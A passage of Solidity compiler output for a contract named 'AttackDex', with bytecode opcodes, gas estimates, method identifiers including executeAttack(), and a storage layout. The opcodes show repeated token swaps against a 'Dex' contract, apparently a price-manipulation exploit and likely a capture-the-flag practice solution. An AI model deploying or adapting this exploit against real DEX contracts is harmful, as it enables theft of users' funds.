PUSH2 0x3F1 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x403 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xDF791E50 PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x2 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x29 PUSH1 0x40 MLOAD DUP5 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x4A6 SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0x8AF JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x4BD JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x4CF JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xDF791E50 PUSH1 0x2 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x2D PUSH1 0x40 MLOAD DUP5 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x572 SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0x91D JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x589 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x59B JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x612 DUP3 PUSH2 0x5E9 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x622 DUP2 PUSH2 0x608 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x63B PUSH0 DUP4 ADD DUP5 PUSH2 0x619 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x664 PUSH2 0x65F PUSH2 0x65A DUP5 PUSH2 0x5E9 JUMP JUMPDEST PUSH2 0x641 JUMP JUMPDEST PUSH2 0x5E9 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x675 DUP3 PUSH2 0x64A JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x686 DUP3 PUSH2 0x66B JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x696 DUP2 PUSH2 0x67C JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x6AF PUSH0 DUP4 ADD DUP5 PUSH2 0x68D JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x6E1 PUSH2 0x6DC PUSH2 0x6D7 DUP5 PUSH2 0x6B5 JUMP JUMPDEST PUSH2 0x641 JUMP JUMPDEST PUSH2 0x6BE JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x6F1 DUP2 PUSH2 0x6C7 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x60 DUP3 ADD SWAP1 POP PUSH2 0x70A PUSH0 DUP4 ADD DUP7 PUSH2 0x619 JUMP JUMPDEST PUSH2 0x717 PUSH1 0x20 DUP4 ADD DUP6 PUSH2 0x619 JUMP JUMPDEST PUSH2 0x724 PUSH1 0x40 DUP4 ADD DUP5 PUSH2 0x6E8 JUMP JUMPDEST SWAP5 SWAP4 POP POP POP POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x74F PUSH2 0x74A PUSH2 0x745 DUP5 PUSH2 0x72C JUMP JUMPDEST PUSH2 0x641 JUMP JUMPDEST PUSH2 0x6BE JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x75F DUP2 PUSH2 0x735 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x60 DUP3 ADD SWAP1 POP PUSH2 0x778 PUSH0 DUP4 ADD DUP7 PUSH2 0x619 JUMP JUMPDEST PUSH2 0x785 PUSH1 0x20 DUP4 ADD DUP6 PUSH2 0x619 JUMP JUMPDEST PUSH2 0x792 PUSH1 0x40 DUP4 ADD DUP5 PUSH2 0x756 JUMP JUMPDEST SWAP5 SWAP4 POP POP POP POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x7BD PUSH2 0x7B8 PUSH2 0x7B3 DUP5 PUSH2 0x79A JUMP JUMPDEST PUSH2 0x641 JUMP JUMPDEST PUSH2 0x6BE JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x7CD DUP2 PUSH2 0x7A3 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x60 DUP3 ADD SWAP1 POP PUSH2 0x7E6 PUSH0 DUP4 ADD DUP7 PUSH2 0x619 JUMP JUMPDEST PUSH2 0x7F3 PUSH1 0x20 DUP4 ADD DUP6 PUSH2 0x619 JUMP JUMPDEST PUSH2 0x800 PUSH1 0x40 DUP4 ADD DUP5 PUSH2 0x7C4 JUMP JUMPDEST SWAP5 SWAP4 POP POP POP POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x82B PUSH2 0x826 PUSH2 0x821 DUP5 PUSH2 0x808 JUMP JUMPDEST PUSH2 0x641 JUMP JUMPDEST PUSH2 0x6BE JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x83B DUP2 PUSH2 0x811 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x60 DUP3 ADD SWAP1 POP PUSH2 0x854 PUSH0 DUP4 ADD DUP7 PUSH2 0x619 JUMP JUMPDEST PUSH2 0x861 PUSH1 0x20 DUP4 ADD DUP6 PUSH2 0x619 JUMP JUMPDEST PUSH2 0x86E PUSH1 0x40 DUP4 ADD DUP5 PUSH2 0x832 JUMP JUMPDEST SWAP5 SWAP4 POP POP POP POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x899 PUSH2 0x894 PUSH2 0x88F DUP5 PUSH2 0x876 JUMP JUMPDEST PUSH2 0x641 JUMP JUMPDEST PUSH2 0x6BE JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x8A9 DUP2 PUSH2 0x87F JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x60 DUP3 ADD SWAP1 POP PUSH2 0x8C2 PUSH0 DUP4 ADD DUP7 PUSH2 0x619 JUMP JUMPDEST PUSH2 0x8CF PUSH1 0x20 DUP4 ADD DUP6 PUSH2 0x619 JUMP JUMPDEST PUSH2 0x8DC PUSH1 0x40 DUP4 ADD DUP5 PUSH2 0x8A0 JUMP JUMPDEST SWAP5 SWAP4 POP POP POP POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x907 PUSH2 0x902 PUSH2 0x8FD DUP5 PUSH2 0x8E4 JUMP JUMPDEST PUSH2 0x641 JUMP JUMPDEST PUSH2 0x6BE JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x917 DUP2 PUSH2 0x8ED JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x60 DUP3 ADD SWAP1 POP PUSH2 0x930 PUSH0 DUP4 ADD DUP7 PUSH2 0x619 JUMP JUMPDEST PUSH2 0x93D PUSH1 0x20 DUP4 ADD DUP6 PUSH2 0x619 JUMP JUMPDEST PUSH2 0x94A PUSH1 0x40 DUP4 ADD DUP5 PUSH2 0x90E JUMP JUMPDEST SWAP5 SWAP4 POP POP POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xB3 SHR PUSH3 0x53A27C STOP MLOAD 0xBB NOT DUP4 CALLDATASIZE 0xB8 PUSH21 0xE8EC5D6CD1A0BF2B23468BE65E1EA3B71B0164736F PUSH13 0x63430008140033000000000000 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "488000",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"dex()": "infinite",
						"executeAttack()": "infinite",
						"token1()": "2552",
						"token2()": "2486"
					}
				},
				"methodIdentifiers": {
					"dex()": "692058c2",
					"executeAttack()": "422490ee",
					"token1()": "d21220a7",
					"token2()": "25be124e"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 40,
						"contract": "dexat.sol:AttackDex",
						"label": "dex",
						"offset": 0,
						"slot": "0",
						"type": "t_contract(Dex)37"
					},
					{
						"astId": 42,
						"contract": "dexat.sol:AttackDex",
						"label": "token1",
						"offset": 0,
						"slot": "1",
						"type": "t_address"
					},
					{
						"astId": 44,
						"contract": "dexat.sol:AttackDex",
						"label": "token2",
						"offset": 0,
						"slot": "2",
						"type": "t_address"
					}
				],
				"types": {
					"t_address": {
						"encoding": "inplace",
						"label": "address",
						"numberOfBytes": "20"
					},
					"t_contract(Dex)37": {
						"encoding": "inplace",
						"label": "contract Dex",
						"numberOfBytes": "20"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}